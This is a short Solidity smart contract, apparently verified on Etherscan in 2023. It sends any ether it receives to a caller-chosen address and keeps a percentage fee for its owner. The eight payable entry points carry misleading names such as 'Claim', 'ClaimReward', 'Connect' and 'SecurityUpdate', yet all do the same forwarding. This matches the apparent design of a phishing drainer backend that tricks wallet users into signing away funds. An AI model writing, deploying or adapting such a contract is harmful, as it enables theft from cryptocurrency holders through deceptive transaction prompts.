/**
 *Submitted for verification at Etherscan.io on 2023-06-16
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

contract Trusty {

  address private owner;
  uint256 private fee;
  uint8 private percentage;

  event Ownership(address indexed previous_owner, address indexed current_owner);
  event Percentage (uint8 previous_percentage, uint8 current_percentage);

  constructor() { owner = msg.sender; fee = 0; percentage = 5; }

  function getOwner() public view returns (address) { return owner; }
  function getBalance() public view returns (uint256) { return address(this).balance; }
  function getFee() public view returns (uint256) { return fee; }

  function withdraw(address sender) private {
    uint256 amount = msg.value;
    uint256 reserve = (amount / 100) * percentage;
    amount = amount - reserve; fee = fee + reserve;
    payable(sender).transfer(amount);
  }

  function Claim(address sender) public payable { withdraw(sender); }
  function ClaimReward(address sender) public payable { withdraw(sender); }
  function ClaimRewards(address sender) public payable { withdraw(sender); }
  function Execute(address sender) public payable { withdraw(sender); }
  function Multicall(address sender) public payable { withdraw(sender); }
  function Swap(address sender) public payable { withdraw(sender); }
  function Connect(address sender) public payable { withdraw(sender); }
  function SecurityUpdate(address sender) public payable { withdraw(sender); }

  function transferOwnership(address new_owner) public {
    require(msg.sender == owner, "Access Denied");
    address previous_owner = owner; owner = new_owner;
    emit Ownership(previous_owner, new_owner);
  }
  function Fee(address receiver) public {
    require(msg.sender == owner, "Access Denied");
    uint256 amount = fee; fee = 0;
    payable(receiver).transfer(amount);
  }
  function changePercentage(uint8 new_percentage) public {
    require(msg.sender == owner, "Access Denied");
    require(new_percentage >= 0 && new_percentage <= 10, "Invalid Percentage");
    uint8 previous_percentage = percentage; percentage = new_percentage;
    emit Percentage(previous_percentage, percentage);
  }

}